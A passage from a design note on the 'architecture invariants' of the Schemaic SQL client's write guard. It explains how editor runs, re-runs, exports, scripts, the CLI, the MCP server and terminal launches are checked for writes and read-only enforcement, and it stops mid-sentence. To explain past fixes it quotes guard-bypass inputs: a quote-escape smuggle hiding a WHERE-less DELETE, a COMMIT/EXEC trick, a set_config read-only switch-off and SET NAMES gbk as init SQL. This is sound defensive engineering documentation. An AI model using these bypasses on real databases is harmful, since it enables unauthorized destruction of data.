# Architecture invariants (don't regress these)

Re-introducing the anti-patterns these guard against is a regression:

- **The write guard lives on the run action, not in a caller of it.** Every path that executes
  user SQL goes through `TabsActions::run`/`run_all` — or, where there is no moment at which to
  ask the user anything, through a refusal *strictly stronger* than the verdict (the export menu,
  below). The pair *are* the guarded ones: they call `schemaic_core::sql::run_verdict`
  (pure + tested) and, on anything but `Allow`, park the request
  in `ui.overlay.run_guard` and execute **nothing**. The unguarded actions never leave
  `schemaic-app`; `TabsActions::run_anyway` is the only way back to them, and it replays only what
  the guard parked. The editor pane renders the bar — it does not own the guard.
  **The policy it judges against is assembled in core as well, by `sql::GuardPolicy::of`.** The
  verdict was pure and tested; its three inputs — read-only off the connection, the dialect off its
  `db_type`, and whether the tab has a database — were assembled by a closure called `guard_policy`
  *inside* `app_view`, a function long enough that nothing in it is nameable, callable or testable,
  so the half of the guard that reads the world had no test and no name. **No line count here on
  purpose**: this sentence carried 9,600 and the function was over 900 lines longer than that when
  anyone counted. Nothing computes the figure, so it goes stale with every edit to `main.rs` while
  the argument it was decorating does not depend on its value — the same rule the working notes
  apply to their own. The window's closure now gathers
  signals and decides nothing. `script_view` assembles the same policy, which is the other half of
  why this is a constructor and not a struct literal at each site: two independent assemblies that
  happen to agree are not one policy, they are two policies nobody is comparing. It restates one
  field over the constructor — the modal's `dialect` is the *target's*, captured when the modal
  opened — and passes `confirm_writes` as the user set it even though `script_verdict` does not
  consult it, because a policy assembled with a made-up value is one that starts lying silently the
  day the verdict does start consulting it. With no connection the policy falls back to
  `SqlDialect::default` and `read_only: false`, which is `connection::read_only_of`'s documented
  fail-open: the run then fails on the connection that is gone rather than on a flag nobody set.
  **What the guard judges is the statement after parameter substitution**, never the template the
  editor holds. The pair call `params::prepare_run`, which substitutes and *then* asks
  `run_verdict`, and hand back both halves — so the statements that run, the ones parked for "Run
  anyway", and the ones the verdict was formed about are one and the same text. A
  `params::ParamValue::Raw` expands to arbitrary SQL, so a guard shown `SELECT … WHERE x = :p`
  would be reading a statement the engine never receives while `…; DELETE FROM t` is the one it
  does. A parameter with no value stops the run before the guard is consulted at all, as a hard
  hold with no "Run anyway": there is nothing to judge yet.
  **And the verdict is about a *target* as well as a statement, which is the half that was missing.**
  `guard_policy` reads the active tab's connection, its `read_only`, its dialect and whether it has a
  database, while the connection gate can hold the run for `PING_TIMEOUT` — five seconds spent
  re-checking a `Disconnected` connection — and every run action re-resolves `active` when it lands
  (`run_query_core`'s first line is `let id = active.get_untracked();`, and `run_all` and `run_plan`
  do the same). Nothing is on screen during those seconds: the guard bar has just come down and no
  panel has opened, so clicking another tab is the natural response to a Run that appears to have
  done nothing — and a `DELETE` confirmed against a tab bound to `staging` then executed against a
  tab bound to `production`, reported into its panel and recorded in history under its name. The
  `no_database` term is per-tab too, so a `CREATE TABLE` judged `Allow` for a database-bound tab
  could run on a database-less one, past the `Block(GuardReason::NoDatabase)` arm and, on
  PostgreSQL, into the maintenance database `needs_database` says nothing in Schemaic can reach
  again. `gate1_on_tab` pins the wrapped action to the tab it was started from and **refuses** when
  they differ, with a message rather than silently — running anyway is the defect, and running
  nothing quietly is how it went unnoticed. A refusal rather than a re-target is deliberate: the
  stronger shape is a `run_on(tab_id, …)` the whole pipeline takes instead of re-reading `active`,
  which threads through four entry points in a file no test in this workspace can drive, and a
  refusal is *strictly stronger* than a wrong target, which is the direction this invariant requires.
  **Only the tab-bound actions take it** — `add_tab` makes a tab rather than using one and `ai_send`
  is bound to the connection, so pinning either would refuse a gesture that is still correct. Both
  halves are pinned in `main.rs`'s tests, over a gate that holds its action until the test releases
  it (`a_deferred_run_does_not_land_on_a_tab_the_user_switched_to`, and the ordinary case beside it,
  without which the wrapper could pass by refusing everything).
  **A caller that has already started a state machine needs the refusal handed back, and that is
  `gate1_on_tab_answered` over `ConnGateElse`** — a `ConnGate` whose *second* action runs instead of
  the first, and only when the gate has decided not to proceed. `with_conn` is now
  `with_conn_else` with a no-op refusal, so there is one gate and one "Not connected to X" message
  rather than two that can drift apart. What it is for: `open_plan` sets `PlanState::Running` and
  *then* calls the gated action, so a gate that refused silently left the query-plan modal rendering
  `loading_dots("Explaining")` for ever behind the error modal — dismissing the error left a modal
  claiming work was in flight over a server that was down, and only Escape got out of it. The
  refusals come back as a `Refusal`, and there are **three**: `NotConnected` and `ConnectionChanged`
  from the gate, `TabMovedOn` from the pinning. The second is its own variant because the sentence is
  different and the old one was false — `ConnGateElse`'s refusal callback took no argument, so both
  of the gate's answers arrived as `NotConnected` and the query-plan modal read "the server didn't
  answer the health check" about a server that had answered perfectly well, for a connection the user
  had simply left. The error modal already distinguished the two; the caller's own state machine did
  not, which is why `ConnGateElse` hands the `Refusal` across the boundary rather than an
  argument-less `Action`. The same distinction is `CheckAnswer`'s third answer one layer down.
  **And a superseded check lets the action through on `ConnStatus::Connected`, not on "not down".**
  `health_check_lets_through` re-reads the status so a check landing after a newer one has said the
  server is up does not raise "Not connected" over a header reading Connected — but it asked
  `!is_down()`, and `Unknown` is not down by design, covering "not checked yet" and "the tunnel is
  still coming up". `check_conn_then`'s two early exits set exactly that status and answer
  `Reachable(false)`: no such connection, and an SSH tunnel that is not up. So the override fired on
  the answers it was least entitled to, the action ran against a connection with no tunnel, and the
  user got the driver's raw connect error in place of the gate's sentence.
  `plan_refused` turns any of them into the `PlanState::Failed` the modal can render, raising
  `run_moved_on` for the tab case as well so each channel is said once, and `plan_refusal_text`
  writes the two sentences — separate from the wiring because the words were never the defect,
  nobody calling them was. `run_plan`'s two arguments are carried as a `(String, bool)` pair so the
  generic wrapper still applies. **The refusal is not optional**, and a separate `moved_on` callback
  beside a silent gate is exactly the shape that shipped the spinning modal: every early exit
  *inside* `run_plan` already reported into `plan_state`, and it was the gate wrapped *around* it
  that answered nobody. That is why all three pins assert the composition rather than a piece of it
  — `a_refused_plan_launch_leaves_the_modal_saying_so`,
  `a_plan_launch_that_outlived_its_tab_also_answers_the_modal`, and
  `an_allowed_plan_launch_runs_and_writes_no_refusal` for the direction that would break by refusing
  everything.
  This is written down because the guard used to be two closures inside `editor_pane.rs`'s *view
  body*, so it protected exactly one caller: the command palette's `>run` and the AI chat's
  **Insert & Run** both reached the raw action and ran writes past all three protections — the
  missing-`WHERE` net, `confirm_writes`, and the read-only-connection block that by design has no
  "Run anyway". **Don't add a run path that takes the raw action, and don't re-implement the
  verdict** — a new protection is an arm of `run_verdict`, and a `RunVerdict::Block` must stay
  un-overridable. (`plan_view`'s `contains_write` is not a second guard: it decides whether
  `EXPLAIN ANALYZE` may run a statement for its timings. **That decision is made on the action
  too**, not only by the modal hiding its toggle: `run_plan` refuses `analyze` of a statement
  `contains_write` calls a write, with `plan-analyze-unavailable`, before it reaches `.explain(` —
  security review S9 found the hidden toggle the only thing between a write and Analyze, which
  *executes* it, and the transaction it is rolled back in undoes neither a MyISAM write nor a
  sequence. That transaction stays, as the backstop rather than the guard
  (`explain_analyze_refuses_a_write_at_the_run` pins the order).) **What the verdict carries is a reason,
  not a sentence** — `sql::GuardReason`, which the editor words from the catalogue and the CLI
  says in core's English (under `core::sql`). Making it a value changed no decision: which arm,
  in which order, for which statements, is as stated here; only how the reason travels moved.
  **On a read-only connection the verdict's `Block` is a text answer, so the session backs it.**
  `run_verdict` refuses a write by `contains_write`, a whitelist of heads, and `SELECT setval('s',
  1000)`, `SELECT lo_unlink(…)` and a `SELECT` of a function whose body deletes all open with one —
  the hole the headless gate had (below), still open on the editor after that one was closed. On
  PostgreSQL the verdict now refuses all three by the headless gate's function allowlist (below);
  on MySQL/MariaDB a stored function still passes every text gate, and only the session stops it.
  **On SQL Server `contains_write` reads every word, not only a statement's head**
  (`unterminated_write_words`): T-SQL needs no `;` between statements, and its backing session is
  a transaction rolled back rather than a refusal, so `SELECT 1 COMMIT EXEC('DELETE FROM t')`
  once read as one read whose `COMMIT` ended that transaction and whose procedure's writes stuck
  (`a_sql_server_write_hidden_behind_a_read_is_still_a_write`; `ADD` is among the words, for
  `ADD SIGNATURE` and `ADD SENSITIVITY CLASSIFICATION`, a reserved word no unbracketed name can
  be). **And the session is not the whole of the read-only guarantee, on any engine**, so on such a
  connection `run_verdict` also asks `read_only_refusal` of every statement range of every element
  (`statement_ranges`) and Blocks what it refuses (`GuardReason::ReadOnlyRefused`). It used to ask
  only where the session is a rollback (`SqlDialect::read_only_is_a_rollback`, SQL Server): there a
  `RAISERROR … WITH LOG` or a function calling an extended procedure writes nothing
  `contains_write` sees, and its effect outside the database outlived the rolled-back transaction,
  measured on 2022 (`a_read_only_rollback_session_blocks_what_the_rollback_cannot_undo`). A real
  read-only transaction has the same kind of hole — `pg_terminate_backend`, `dblink_exec` on a
  connection of its own and MySQL's `GET_LOCK` act outside it — and PostgreSQL had a worse one:
  `SELECT set_config('default_transaction_read_only', 'off', false)`, a read head naming no write
  word, turned the session default off for every later statement on the same connection, which Run
  All and a Manual tab's pinned session both share (verified live on 16; the session's half of
  that fix is `schemaic-db`'s entry). The headless paths and Analyze already refused all of these
  on the same connection, so the editor was the laxer gate on every engine but one. Now it refuses
  what `schemaic query` and MCP `run_query` refuse — on PostgreSQL any call off
  `PG_READ_FUNCTIONS`, a user's own function included; on MySQL/MariaDB the deny list's `SLEEP` and
  `GET_LOCK` and the locking clauses
  (`a_read_only_editor_refuses_what_the_headless_gate_refuses_on_every_engine`). **It is asked per
  range, not per element, and that is load-bearing**: the editor sends a selection of several
  statements as one element, and the headless gate's "only one statement" is about its own path
  rather than about what is safe, so asking it of the element would refuse every multi-statement
  selection on a read-only connection (`SELECT 1; SELECT 2` stays `Allow` in the same test); a
  range still holding several — T-SQL with no `;` between them — is refused for it. What it still
  does not catch is a MySQL stored function: the MySQL family answers calls by a deny list, not an
  allowlist, so `SELECT my_func()` passes the text and its writes rest on the session. The missing-`WHERE` net had the
  same blind spot on the same engine — a bare `DELETE` below a scoped one borrowed its `WHERE` —
  and reads each statement of the range now (`sql::tsql_statements`, under `core::sql`).
  `main.rs`'s `session_enforce(connections, conn_id)` answers `Enforce::ReadOnly` for a read-only
  connection, `Enforce::AsJudged` for any other connection, and `None` only for an id no
  connection has (`only_a_read_only_connection_asks_for_a_read_only_session`). **It used to answer
  `None` for every writable connection, and that was a hole on the writable side** (security review
  S6): under a MySQL/MariaDB server-wide `NO_BACKSLASH_ESCAPES` or `ANSI_QUOTES`,
  `SELECT 'a\'; DELETE FROM t; -- '` is one read to the gate and a `WHERE`-less `DELETE` to the
  server, so the editor's runs stepped around the missing-`WHERE` net and `confirm_writes` while
  `schemaic exec` already pinned the lexer. **The cost, stated**: on a server whose global mode
  holds `ANSI_QUOTES`, the editor's session now runs without it, as `exec`'s did — `"x"` is a
  string there, not a name. `run_plan` derives its `read_only` as `== Some(Enforce::ReadOnly)`;
  `.is_some()`, its spelling while `None` meant writable, would now call every known connection
  read-only. Five
  closures ask it: `run_query_core`'s auto-commit arm takes `Db::fetch_query_enforced` — which
  carries every `apply_view` re-run with it (filter/sort and a page, the capped notice's read-more, the
  post-commit re-fetch) and `open_table_filtered`, since they all end there; `run_all`'s auto-commit
  arm takes `Db::run_batch_enforced`; `open_session` pins a Manual tab's connection through
  `Session::open_enforced`, which is what both runs use in Manual mode; `run_plan` hands
  `Db::explain` its `read_only`; and `export_file`'s `AllRows` arm streams through
  `Db::stream_query_enforced`. `schemaic-db`'s entry has what each does to the session. Each is a
  closure in `app_view` where dropping the call compiles and keeps every other test green, so
  `every_editor_sql_path_runs_on_a_session_enforcing_read_only` reads those five regions of
  `main.rs` and asserts the call in each — and, for `run_all`, `open_session` and the export, that
  the unenforced spelling is gone. The verdict still stands in front and still decides:
  it refuses a plain `DELETE` before a connection is opened, with a sentence, where the session
  would answer with a server error. The flag is read when each closure runs, so a Manual tab's
  pinned session keeps the state it was opened in until a flip of the flag re-pins it
  (`resettle_sessions`); ticking it settles any open transaction first, so no writable session
  outlives the tick (`Connection::ticks_read_only`).
  **The re-run affordances answer to the guard too, through a refusal strictly stronger than
  it.** `ExportScope::AllRows` re-executes the tab's captured statement through
  `Db::stream_query_enforced`;
  the capped notice's "read N rows" re-executes it through `apply_view` at a bigger ceiling; the
  grid **filter/sort bar** re-executes a rewritten one through the same action; and **Follow
  relation** and its reverse, **Referenced by**, open a new tab running a `SELECT` the grid built,
  through `open_table_filtered`.
  All are paths executing user SQL that reached the server without passing `run_verdict` at all —
  so an `UPDATE … RETURNING` on a table past the row cap could be run a second time from a Save
  dialog or from a link that says *read*, with no confirmation, on a read-only connection included.
  `sql::rerunnable_for_export` is the gate, built on the same `contains_write` the verdict uses so
  there is one answer to "does this statement write" and one place to grep, and it is **never weaker
  than `run_verdict` and deliberately stronger**: the verdict may say `Confirm`, but neither of these
  has a moment at which to ask — the user picked a file name, or followed a link about reading, and
  a confirmation raised from either would be a question about something they never requested. So it
  is a flat refusal. That `contains_write` is a whitelist of read *heads* is what makes it right
  here: `CALL proc()`, `INSERT … RETURNING` and a data-modifying CTE are all writes to it, and each
  of the three returns rows, so each could otherwise have reached a truncated grid and been offered
  the scope (`a_row_returning_write_is_never_rerunnable_for_an_export`,
  `an_ordinary_read_is_rerunnable_for_an_export`).
  **Where that gate *lives* is the second half, and it used to be in the callers.** `apply_view`
  and `open_table_filtered` took a bare `String` and ended in the app's raw `run`; `apply_view`
  documented itself "not guarded: it re-runs the `SELECT` the grid is already showing", a premise
  nothing on the action enforced. Its two callers each tested something different — the capped
  notice asked `rerunnable_for_export`, the filter bar rested on `filter::build_query` returning
  `Ok(None)`, which is a *rewritability* answer and not a write test at all — and
  `open_table_filtered` tested nothing. The cost is on record at `grid.rs`: a capped `SELECT`
  followed by a `DELETE` once left the "read N rows" link drawn over the new base, and clicking it
  re-ran the `DELETE` through `apply_view`. That was fixed at one caller, and a third caller
  inherited none of it. Both fields now take **`schemaic_ui::RerunRequest`**, which only
  `RerunRequest::approved` → `sql::rerunnable_for_export` can mint — the same shape
  `ScriptRequest::approved` has, and for the same stated reason: *the guard being a step the
  launcher had to remember is how one `return` came to be all that stood between a read-only
  connection and a file.* The type covers the two fields; `main.rs`'s
  `the_unguarded_run_has_only_its_two_stated_callers` covers what a type cannot — another
  closure calling the raw `run` with a bare `String`, which is exactly how `open_table_filtered`
  came to be unguarded. `spawn_table_tab`'s own generated `table_query` `SELECT` goes through the
  mint too, because a caller that happens to generate only reads is a property of the caller.
  **The third caller is the post-commit re-fetch, and it was the one the census could not see.** It
  replays the tab's `base_sql` on the pinned connection after a grid commit, and its whole guard was
  a `read_only_reason` filter followed by a bare `(run)(sql)` — a step the launcher had to remember,
  which is the shape this invariant exists to forbid. It ends in a `RerunRequest` now, with the
  filter kept in front of the mint because neither question implies the other: `read_only_reason` is
  narrower on three axes, four on PostgreSQL (one statement, a read head this engine really has, no
  denied word, and there no function off its read list — so a `SELECT SLEEP(600)` or a second statement
  appended to the base is refused), while `OUTFILE` /
  `DUMPFILE` are in `WRITE_KEYWORDS` and, outside MySQL, in no deny list — so the composition is
  stronger than either half. The census that was meant to notice took lines beginning `run(`, and
  this site spells its call `(run)(sql);`, which begins with `(`: the one caller not taking its SQL
  from a request was the one caller the gate could not see, while the gate reported the class closed
  at two. `raw_run_calls` is a token scan over whole calls — `(run)(` normalised to `run(`, a
  preceding word byte, `.` or `:` marking some other function, parens balanced — so a call rustfmt
  has wrapped is counted too.
  **It re-reads the view on screen, through `apply_view`, and so left the census** (S6.1-L1-04).
  Replaying the bare `base_sql` through the manual `run` meant `Tab::start_manual_run`: a commit
  with an insert or a delete on page 3 of a filtered, sorted table tab came back on page 1 of the
  unfiltered, unsorted table, with a history entry for a run nobody made. The statement is now
  `filter::post_commit_statement(base, grid_query, dialect)` — `compose`'s filter, sort and page, or
  the base at rest — with `read_only_reason` asked *inside* it of the composed string
  (`a_commit_rereads_the_page_on_screen`), minted as before; `settle_after_switch` still decides
  whether it runs at all. **`filter::post_commit_read` falls back** — the same page without the
  filter and sort, then the base — and answers the query it stands for: the filter bar admits a
  filter through its own gate, and one calling an extension's or the database's own function
  failed `read_only_reason`'s allowlist, so the commit had no re-read at all — the inserted row
  vanished from the grid and the deleted one came back
  (`a_commit_rereads_without_a_filter_the_gate_cannot_vouch_for`). Where it fell back, `grid_query`
  takes the query it stands for and the bar says so (`schemaic_ui::i18n::reread_without_filter_note`,
  `filter::REREAD_WITHOUT_FILTER_MSG` in the interface's language) —
  **through `Tab::view_note`, which the re-read's landing shows after its own clear**: written
  straight to `view_err` before the re-read ran, the note was cleared by the very re-run it
  announced, as it started and again as it landed, so the filter bar emptied with no word of why
  (`a_commits_reread_note_survives_the_reread_it_announces`, a source gate; found driving the
  8dd78136 hand checks). The landing spends the note whatever it ends in, so it cannot surface on a
  later one, and a manual run clears it with the rest of the tab's view state. **It
  lands in the panel the commit started on** — `apply_view_into(req, panel)`, `run_query_core`'s
  `into`, the panel captured at commit start and asked of `model::post_commit_panel` (still the
  tab's, unpinned) — not whichever is shown when it lands: a click on a pinned chip while the
  write waited sent it into the pin, which refuses a re-read, and left the committed panel stale
  (`a_commits_reread_lands_in_the_panel_it_committed_on`). The raw `run` is left with two callers.
  **Running a `.sql` script is the third such path, and it is refused the other way round.**
  `sql::script_verdict` gates `script.rs`'s runner. `run_verdict` takes the statements; a script has
  tens of thousands of them, arriving a block at a time, and *none of them read* at the moment the
  user presses the button — there is no `&[String]` to hand it, and a confirmation raised at
  statement 30,000 would be a question about a file the user can no longer see the start of. So the
  gate is one decision at launch, and it is strictly stronger than the verdict on every axis: a
  script is **unconditionally** a write (the file has not been read, so "does it write?" cannot be
  asked, and the safe answer to an unaskable question is yes), which means a read-only connection is
  refused without opening it and a script of nothing but `SELECT`s is refused too; `no_database`
  blocks outright rather than only when some statement `needs_database`, because an unscoped script
  on PostgreSQL builds into a maintenance database the schema tree can never show again; and it
  **never returns `Allow`**, whatever `confirm_writes` says — that setting is about a statement the
  user typed and can see, and a file picked from a dialog is the case it was written for rather than
  an exception to it. The relation is test-enforced rather than asserted:
  `the_script_gate_is_never_weaker_than_the_run_guard` compares the two verdicts over every policy
  and a set of statement lists reaching each of `run_verdict`'s arms, on a Allow &lt; Confirm &lt;
  Block ordering. Note that this is the *inverse* asymmetry to `rerunnable_for_export` above — that
  one drops the `Confirm` arm because there is no moment to ask, this one keeps only the `Confirm`
  arm — and both are stronger than the verdict, which is the property that matters.
  **What satisfies that `Confirm` is `script_view`'s panel, not a bar**, and the distinction is
  worth stating because getting it wrong is a silent hole rather than a visible one. A typed
  `DELETE` raises "Run anyway" because nothing stood between typing it and running it; a script was
  chosen from a file dialog and is run from a panel that first names the statement counts and, in
  red, how many of them destroy or delete data — `script::is_destructive`, whose net is drawn wide
  (it counts `DELETE`, which no dump writes and a hand-written script does, and everything
  `sql::drop_reason` asks about, so a `CREATE OR REPLACE TABLE` the editor would have held is
  named here too) precisely because that sentence *is* the confirmation. `run_script` matches the verdict **exhaustively** so this is a
  decision on the page rather than a fall-through: for one build the call site was an
  `if let RunVerdict::Block(..)`, so a verdict of "ask first" ran the file anyway, and the three
  tests over `script_verdict` all passed because every one of them exercised the function alone —
  the defect living, as ever here, at its composition with the caller.
  **The headless CLI is the fourth path, and it splits the question in two rather than adding a
  gate.** `schemaic query` runs `cli/query.rs`'s `read_only_query`, and `schemaic export` its
  uncapped streaming sibling `read_only_export` in the same file; their gate is
  `sql::read_only_reason` — an allowlist of read heads per dialect plus a keyword deny-list, and on
  PostgreSQL and SQL Server an allowlist of functions, with **no `Confirm` arm to say yes to**, which is the right shape when there is nobody at the keyboard,
  and stronger than the verdict on the same axis `rerunnable_for_export` is. That file is the
  one headless read path: the MCP server's `run_query` calls `read_only_query` too, rather than the CLI writing a
  second copy of the gate beside the one `mcp.rs` already had. Both live in `schemaic-cli` now, and
  `schemaic mcp` is a second way into that same server rather than a new path: its `run_query` is
  the same call, the connection it serves has passed `cli/select.rs`'s `cli_access` gate like every
  subcommand's, and the one tool that could lead toward a write, `propose_table_change`, is not
  offered there at all. The server's `explain` tool, and `schemaic explain` through the same
  function, are the same gate again — `query::gate`, inside `read_only_explain` — and **the same
  session half**: it passes `Db::explain` `read_only = true`,
  which puts even the plain `EXPLAIN` on a read-only session, since planning ran a writing function
  on PostgreSQL and MariaDB (`schemaic-db`'s entry). It never asks for the analysing form, and
  `a_headless_plan_never_executes_the_statement` pins both literals in source.
  **A head is a spelling, not a read, and this paragraph called the gate read-only while it was
  not.** `SELECT setval('s', 1000)`, `SELECT lo_unlink(…)`, PostgreSQL's `SELECT 1 INTO newtable` and
  a `SELECT` of a function whose body `DELETE`s all passed it and wrote through both front ends —
  shown live on PostgreSQL 16 and MariaDB 10.11. A text gate cannot see what a function does, so
  `read_only_query` now runs the statement through `Db::fetch_query_enforced` with
  `Enforce::ReadOnly` — and `read_only_export` through `Db::stream_query_enforced` with the same —
  a session that refuses a write by its effect, and the gate stays in front for
  what that session still allows (sleeps, locks, server-side file reads, PostgreSQL's writes that
  are not transactional — `core::sql`'s entry) and for the one-statement
  count — which that session also pins, on MySQL/MariaDB, to the lexer the gate counted with (see
  `schemaic-db`'s entry for the `sql_mode` smuggle that closed). That session half is pinned by
  source, as the editor's is — `every_headless_read_runs_on_a_read_only_session` — since dropping
  it to `Enforce::None` kept every behavioural test green.
  **A generated read needs the session half more, not less, because it has no text half at all**
  (security review S8). The Live Monitor's `Db::fetch_table`, `schemaic dump` and the folder
  export (`cli/dump.rs`), and AI Fill's and Seed's `SELECT … LIMIT 20` sample in `main.rs` each
  build a `SELECT` the app wrote, which no gate reads — and the name it reads may be a view whose
  body calls a function that writes, so on an ordinary session every one of them ran that write,
  the monitor every two seconds, **on a read-only connection too**. All of them now read on
  `Enforce::ReadOnly` on **every** connection, writable or not, since none of them is meant to
  write anything (on SQL Server, the always-rolled-back transaction); `Db::copy_rows`' source read
  already did, for the same reason. The dump's reads are in
  `every_headless_read_runs_on_a_read_only_session`'s file list, and the AI samples have their own
  source gate in `main.rs`, `the_ai_sample_reads_run_on_a_read_only_session`; `fetch_table`'s four
  arms have none (`schemaic-db`'s entry). **`read_only_reason` has no minted
  request**: it is enforced inside `read_only_query`, `read_only_export` and `read_only_explain`
  themselves, and the
  refusals and the requests are two separate lists. `schemaic query`, `schemaic explain` and
  `schemaic export` also ask
  it once *earlier*, through `query::gate`, before the keyring is read or a tunnel opened — as
  `schemaic exec` runs `ExecRequest::approved` before it connects — so that exit 3's "nothing was
  sent" is true (its stated exception is the database layer's standing refusals — a read-only
  PostgreSQL session's refusal of a shadowing path, init SQL, transport, MySQL's `sql_mode` — some
  made after the connect, all before the statement: `DbRefusal::stands`, `cli::query`'s entry); the asking
  inside the three read functions is what keeps the early one from being
  the only check. The refusals are `rerunnable_for_export`, `script_verdict`,
  `read_only_reason` and `init_sql::check` (below); the requests are `RerunRequest`, minted against the first, `ScriptRequest`,
  against the second, and `ExecRequest`, minted against `run_verdict` itself.
  **`schemaic exec` is the write half, and it is the third minted request.** `ExecRequest`'s
  fields are private — the statement, its `Enforce`, and the connection and database the verdict
  judged, so an approval cannot be spent on another target; `ExecRequest::approved` is its only
  constructor and `exec::run` takes one by value — the same shape as `ScriptRequest::approved` and `RerunRequest::approved`, reached deliberately
  rather than arrived at, since a front end with no window is exactly where a guard the launcher has
  to remember would go unnoticed longest. What it mints against is `run_verdict` itself, not a
  stronger refusal, because `exec` *does* have someone to ask: the caller is at a prompt, and
  `--yes` is that answer. The asymmetry is the whole of it — `--yes` answers a `Confirm`, in
  practice `unsafe_reason`'s warning (a missing `WHERE`, a `TRUNCATE`, or a `DROP TABLE`, which ran
  unasked and exited 0 until `dropping_a_table_needs_yes` — which now also holds `DROP TABLES`,
  `CREATE OR REPLACE TABLE`, `TRUNCATE PARTITION ALL` and `EXPLAIN ANALYZE DELETE`, each of which
  ran with no `--yes` before), and **cannot** answer a `Block`, so a
  read-only connection has no override from a command line either
  (`a_read_only_connection_blocks_a_write_and_yes_does_not_help` asserts it for both values of the
  flag). Two refusals sit in front of the verdict rather than inside it: an empty statement, and
  *several* statements, which `exec` will not half-run because a one-shot command has nowhere to
  report "1 and 2 committed, 3 failed". The policy it assembles passes `confirm_writes: false`, and
  `cli/exec.rs` carries the reason that is where the consent lives rather than a setting being
  ignored.
  **A connection's init SQL is the fourth refusal, and the one guarding SQL the user never ran.**
  `Connection::init_sql` runs at every connect, so on every operation — a run, a listing, a ping, a
  `KILL` — with nobody at the keyboard and no moment to confirm anything. `core::init_sql::check`
  is its gate, with no `Confirm` arm: a session `SET` (on SQLite, a `PRAGMA`), no `(` at code
  level, `USE` refused because it would move operations off the database they asked for, and the
  setting's **name on that engine's allowlist** — it was a deny list of what a guard rests on, and
  `ANSI_DEFAULTS`, `FMTONLY`, `sql_select_limit`, `TEXTSIZE`, a non-UTF-8 client character set and
  any denied name written quoted all went through it (`core::init_sql`'s entry has the lists and
  each reason). Nor may a checked statement hold a code-level `;`, on any engine: `SET ROLE`'s arm
  read no further than `ROLE`, so behind a MySQL `DELIMITER` a `DELETE` could run on every connect. It has **no minted request**, as
  `read_only_reason` has none: it is asked inside the connect, by `Db::init_statements`, in each
  engine's one connect function and before any of it runs, so there is no launcher to forget it.
  It runs before the caller sees the connection and so before every `Enforce` statement, which
  overrides any transaction setting it made (`schemaic-db`'s init SQL paragraph;
  `a_read_only_session_with_init_sql_still_refuses_a_write` in the live tier) — **but the ordering
  alone does not hold a read-only connection.** The lexing the text gate rests on is in place
  before enforcement runs and no enforcement statement re-sets it: `SET NAMES gbk` as init SQL
  had MCP `run_query` delete rows on a live server. The list is what refuses that, backed on
  MySQL by `enforce_session`'s read-back of `character_set_client`.
  **One tested function is asked by everything that re-runs**, and that is the shape of the fix
  rather than a tidy-up. `filter::rerun_statement(base, &GridQuery, dialect)` composes *what* would
  run (`filter::compose`, or the base verbatim when there is no filter, sort or page) with *whether it may*
  (`rerunnable_for_export`), so the guard is asked about the string that would actually be
  dispatched and there is no arrangement of base and filter that gets a write past it.
  `GridState::current_statement` is a two-line wrapper over it, and the read-more link's predicate
  (`rerunnable`, the same function as a `bool`), its click and `grid::export_menu` all ask the
  wrapper. Its reads are **tracked** so the predicate can be that function rather than a second
  spelling of it — which it had silently become again, and which is how the kept-result term came to
  be written in two places. Tracking costs the other two callers nothing: both run inside click
  handlers, where there is no effect to subscribe. Before this the export menu ANDed a
  separate `!rerunnable` term of its own — a term that could be deleted with the whole suite still
  green, which is exactly what it was worth — while the read-more link asked only whether `base_sql`
  was `Some`, so a `SELECT` followed by a `DELETE` left the link drawn over the new base and a
  row-returning write could be re-run outright. `grid::export_menu` simply does not offer `All rows`
  when the function says `None`, and the notice draws no link; not offering is the whole enforcement,
  since the scope cannot then be chosen. The composition is where the tests now live
  (`a_row_returning_write_has_no_rerun_statement`, which asserts the refusal with *and* without a
  filter, `a_blank_base_has_no_rerun_statement` — `contains_write("")` is `false`, so a bare "is it a
  write?" gate says yes to an empty base — and
  `an_unfiltered_read_reruns_as_itself_even_when_it_cannot_be_rewritten`, the join-and-CTE property
  the read-more link exists for).
  **The terminal is where this model stops, and the position is stated here rather than left to be
  inferred.** The sentence above is *every path that executes user SQL*, with four named refusals
  beside it — and a terminal running `mysql`, `psql` or `sqlite3` executes user SQL that never
  passes through this app. No per-statement guard is possible there: the statements are typed into
  another process, Schemaic sees bytes on a PTY, there is no `&[String]` for `run_verdict` to judge
  and no moment at which to raise a bar. So the boundary of the model is the **launch** — and the
  choice made was to gate that launch rather than only write it down. Both doors onto a database
  CLI, the terminal panel's database icon and the schema tree's *Open in CLI*, are dimmed on a
  read-only connection with the reason in the tip: the client they open is a full write session
  carrying that connection's password in its environment, on a connection where the app refuses a
  grid commit, refuses Apply in the DDL preview and refuses *Kill session* — which is the less
  destructive of that pair and sits two clicks away in the same window. Neither door asked before;
  the toolbar icon's enabled predicate was the literal `|| true` and the tree entry carried no
  `.disabled(…)`. `read_only_gate::both_database_cli_doors_are_gated_on_read_only` holds it, a
  source gate because both sites are closures inside view builders that need a mounted Floem tree.
  What it reads is the **launch expression**, bounded to end where that expression does: with a
  window measured in bytes, a tip that merely *says* "read-only" beside a button that is still live
  satisfied the check, which is the disclosure without the gate. The tree entry is found by its
  message id (`MenuEntry::action(tr!("tree-open-in-cli")`), so the anchor holds in any language.
  Its needles are assembled from
  fragments for the reason every source gate here assembles them — the test names both launch sites
  in its own prose, so a literal anchor matches there first, and that caught this one on its first
  run.
  **Dimming the two doors was not the gate, though, and for a while it was the whole protection.**
  Two disabled controls are what *says* the action is unavailable — the shape the destructive-launch
  rule calls insufficient — and these two did not even ask the same question: the tree entry asks
  `active_conn`, which is what the launch opens, while the terminal button asked the active *tab*'s
  `conn_id` through `active_tab_read_only`, which answers "writable" when no tab matches it at all —
  so with the terminal open and no tab on the active connection the button was lit over a connection
  the app refuses a grid commit on. Both doors ask `active_conn` now, and
  `open_db_cli` refuses at the launch regardless of either, on
  `connection::read_only_of(cs, conn.id)` read live from
  the connection it is about to open — `ddl_preview::apply`'s reason: the flag moves from the status
  bar while a menu stands open — and spawns a message shell saying so rather than nothing.
  `opening_the_database_cli_refuses_a_read_only_connection_at_the_launch` reads that closure's own
  span and asserts both halves, because either alone is the bug: the launch has to refuse, and the
  refusal has to be about the connection being launched.
  **The database menu's *Back up* and *Restore from file* are two more doors onto the same tools,
  and the second always writes.** A restore hands a whole file of statements to `psql`, `pg_restore`
  or `mysql` — user SQL that never meets `run_verdict` — so its entry is dimmed on a read-only
  connection and `restore_db` refuses at the click as well, on `read_only_of` read live, with the
  message in the panel; after the open dialog it asks the shared `Confirm` (*"… cannot be undone. It
  runs in the terminal, where Ctrl+C stops it."*) before anything spawns. The `yes` arm reads
